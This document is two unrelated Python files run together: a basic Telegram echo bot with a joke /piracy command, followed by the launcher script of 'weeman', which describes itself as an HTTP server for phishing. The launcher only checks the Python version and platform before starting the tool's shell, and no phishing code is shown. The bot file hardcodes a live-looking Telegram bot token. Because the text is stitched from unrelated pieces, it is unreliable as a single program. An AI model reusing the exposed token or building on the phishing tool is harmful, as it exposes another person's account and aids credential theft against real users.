import logging

from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)


# Define a few command handlers. These usually take the two arguments update and
# context. Error handlers also receive the raised TelegramError object in error.
def start(update, context):
    """Send a message when the command /start is issued."""
    update.message.reply_text('Hey this is your bot!')


def help(update, context):
    """Send a message when the command /help is issued."""
    update.message.reply_text('Currently I am in Alpha stage, help me also!')

def piracy(update, context):
    update.message.reply_text('Ahhan, FBI wants to know your location!')


def echo(update, context):
    """Echo the user message."""
    update.message.reply_text(update.message.text)


def error(update, context):
    """Log Errors caused by Updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)


def main():
    """Start the bot."""
    # Create the Updater and pass it your bot's token.
    # Make sure to set use_context=True to use the new context based callbacks
    # Post version 12 this will no longer be necessary
    updater = Updater("5246906292:AAEIjrBxqxAVbN03i1AqtOKECf6euMSpBhg", use_context=True)

    # Get the dispatcher to register handlers
    dp = updater.dispatcher

    # on different commands - answer in Telegram
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("piracy", piracy))

    # on noncommand i.e message - echo the message on Telegram
    dp.add_handler(MessageHandler(Filters.text, echo))

    # log all errors
    dp.add_error_handler(error)

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()


if __name__ == '__main__':
    main()

#!/usr/bin/env python2
##
## weeman - http server for phishing.
##
## Written by Hypsurus <hypsurus@mail.ru>
##

import sys
from core.misc import printt

try:
    from bs4 import BeautifulSoup as bs
except ImportError:
    printt(1, "Please install beautifulsoup 4 to continue ...")

def tests_pyver():
    if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
        pass # All good
    elif "3" in sys.version[:3]:
        printt(1,"Weeman has no support for Python 3.")
    else:
        printt(1, "Your Python version is very old ..")

def tests_platform():
    if "linux" in sys.platform:
        printt(3, "Running Weeman on linux ... (All good)")
    elif "darwin" in sys.platform:
        printt(3, "Running Weeman on \'Mac\' (Not tested)")
    elif "win" in sys.platform:
        printt(3, "Running Weeman on \'Windows\' (Not tested)")
    else:
        printt(3, "If \'Weeman\' runs sucsessfuly on your platform %s\nPlease let me (@Hypsurus) know!" %sys.platform)

def main():
    tests_pyver()
    tests_platform()
    from core.shell import shell
    shell()

if __name__ == '__main__':
    main()
